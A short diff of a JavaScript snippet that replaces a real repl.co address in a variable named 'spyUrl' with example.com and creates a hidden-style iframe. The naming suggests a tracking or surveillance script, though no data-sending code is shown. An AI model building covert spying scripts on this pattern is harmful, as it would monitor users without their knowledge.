@@ -1,4 +1,4 @@
-var spyUrl = "https://58436c93-ba1e-4f89-8fa1-2dfb13f05f1a-00-3bfwyowqvif3r.kirk.repl.co/";
+var spyUrl = "https://example.com/";
 var iframe1 = document.createElement("iframe");
 iframe1.setAttribute("src", "about:blank"); // Replace with your actual website URL
 iframe1.setAttribute("class", "access-frame");
